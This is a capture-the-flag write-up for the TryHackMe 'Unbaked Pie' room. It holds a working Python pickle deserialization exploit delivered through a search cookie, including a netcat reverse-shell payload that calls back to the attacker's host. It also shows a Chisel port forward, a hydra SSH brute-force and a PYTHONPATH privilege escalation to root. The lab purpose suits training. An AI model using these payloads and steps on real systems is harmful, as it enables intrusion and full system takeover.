# 59 - Unbaked Pie (Python Serialization exploit, PYTHONPATH env variable exploit)

Room Link --> [https://tryhackme.com/room/unbakedpie](https://tryhackme.com/room/unbakedpie)

### Enumertion

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.166.161 --min-rate 10000

PORT     STATE SERVICE    REASON  VERSION
5003/tcp open  filemaker? syn-ack
```
{% endcode %}

Navigation to the web server using Mozilla we get a standard web page and the web application seems to be running python instance. The best guesses we can have for now is that the site is running Django

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*8Hn2KU4KLKsqSMKEple8BA.png" alt="" height="330" width="700"><figcaption></figcaption></figure>

First i tried to navigate to the different linked and found a login page

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*acZYE01LPvJLBdjPexYS6A.png" alt="" height="191" width="700"><figcaption></figcaption></figure>

I tried obvious credentials on the login page but it didn’t work. Navigating to various link and saw an Django error message that showed that Django was on debug mode.

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*B4ayBQVwtozJb3FxiEH6Mw.png" alt="" height="377" width="700"><figcaption></figcaption></figure>

Django being set on debug isn’t a vulnerability as such but it can lead to sensitive information disclosure like passwords and secret\_keys if other names other than passwords and secret are used. But as you can see below all our passwords and secret\_keys have been masked

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*FcAe44BTssIb_T87_2AFrg.png" alt="" height="378" width="700"><figcaption></figcaption></figure>

From here whenever we search for an item in the homepage, there is a `search_cookie` that is set and assigned to our query.&#x20;

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lets decode it.

{% code overflow="wrap" lineNumbers="true" %}
```python
import pickle
import base64

encoded_cipher = "gASVCQAAAAAAAACMBXB3bmVklC4="
decoded_cipher = base64.b64decode(encoded_cipher)

print(f"Decoded b64 cipher : {decoded_cipher}")

unpickled_data = pickle.loads(decoded_cipher)
print(f"Unpickled data : {unpickled_data}")
```
{% endcode %}

Outputs

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So any search request we make is basically Serialized and base64 encoded and then sent to the server, which then deserializes the query and process a response for us. Meaning we can send a malicious serialized payload as search query in order to get RCE.

To prove this, we do a simple ping, ie; we make the server send a ping to us, if we get a ping from the server then we know the server can reach us and we can craft a payload to get reverse shell.

Googled Python Serialization exploits and landed on this [blogpost](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('ping 10.18.88.214 -c2')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
    
    
# outputs
gASVMAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBVwaW5nIDEwLjE4Ljg4LjIxNCAtYzKUhZRSlC4=
```

Now we intercept the traffic with burp and replace the search\_cookie with this value. Setup tcpdump: `sudo tcpdump -i tun0 icmp` .

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we get a ping back..

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ("nc 10.18.88.214 9001 -e /bin/sh")
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))

# output
gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAxMC4xOC44OC4yMTQgOTAwMSAtZSAvYmluL3NolIWUUpQu
```

Setup NC listener on port 1234.

And we got a root shell instantly.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

But looking at the root folder it looks like we landed on a docker environment.

Here we can clearly see that the user was trying to login into 172.17.0.1 using SSH as user ramsey. And as this is a docker container, that IP is the IP address of the host. But the SSH was not open on all interfaces otherwise we would have seen on the output of the nmap.

#### Port Scan using nc[Permalink](https://shishirsubedi.com.np/thm/unbaked\_pie/#port-scan-using-nc) <a href="#port-scan-using-nc" id="port-scan-using-nc"></a>

As there was no nmap on the docker container, I used netcat for scanning for open ports.

```bash
root@8b39a559b296:~# nc -zv 172.17.0.1 1-65535
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 5003 (?) open
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 22 (ssh) open
```

And it turned out SSH is open on the 172.17.0.1 interface. Even though SSH was open and we know a user on the box, we still do not know the password for the user. So, I began to enumerate the docker container if there are any sensitive files leaking the credentials.

So the dev rmoved SSH from the server, we have to do Port Forwarding to our kali.

#### Port Forwarding with Chisel

Setup server on kali:

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ ./chisel_1.9.1_linux_amd64 server --port 4444 --reverse
```

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Setup client on victim

{% code overflow="wrap" lineNumbers="true" %}
```bash
root@8b39a559b296:/tmp# ./chisel_1.9.1_linux_amd64 client 10.18.88.214:4444 R:22:172.17.0.1:22
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we have port forwarded to our port 22, but we have usename: `ramsey` but no password, we could try to bruteforce with hydra.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ hydra -l ramsey -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh

[22][ssh] host: 127.0.0.1   login: ramsey   password: 12345678
```
{% endcode %}

And we got the password.

<figure><img src=".gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We are in.

### Priv Esc

#### Exploiting PYTHONPATH environment variable

Running sudo -l again we see that the user Oliver can run a script called dockerScript.py as the root user without knowing the root’s password

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*LXL9CDGIgaWJuL9Pn7XLlg.png" alt="" height="122" width="700"><figcaption></figcaption></figure>

But we can set our own PATH since we have been provided with the option SETENV as you can see from the screenshot above.

Looking at the python script we only have read and execute permission and not write access

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*V5_YdIw44jtAf5KvB5mV4w.png" alt="" height="52" width="700"><figcaption></figcaption></figure>

But taking a closer look at the script we can see that it imports a docker module.

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*2SZezRgDYD4OnvuGrixeKA.png" alt="" height="110" width="700"><figcaption></figcaption></figure>

And since we can control the path the script uses to import the docker module we can create a malicious module which when executed it will drop us on a root shell

First Let’s create a directory called devel you can name it whatever you want

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*HRYhTYTLSFWFC7s5vs8VDg.png" alt="" height="50" width="700"><figcaption></figcaption></figure>

Next we create a \_\_init\_\_.py file and a docker.py file which will contain the malicious python code

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*xmkvOMPuwZ9T1l3F6EwqxA.png" alt="" height="78" width="700"><figcaption></figcaption></figure>

Let’s create a malicious python code in the docker.py file

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*3YKGypVQMbAQjJ8zo6LviQ.png" alt="" height="75" width="700"><figcaption></figcaption></figure>

When the docker.py file will be imported it will spawn a root shell as the user who will be running the python script which in our case will be root.

Now all we have to do is save the script and execute it passing our own python path and we’ll be golden

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*XkFtfmwtIqsKavEGzzgZOw.png" alt="" height="60" width="700"><figcaption></figcaption></figure>

Executing the command

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*teApweZerPME3sFfJyKwow.png" alt="" height="93" width="700"><figcaption></figcaption></figure>

We get root on the box just like that.

Done !

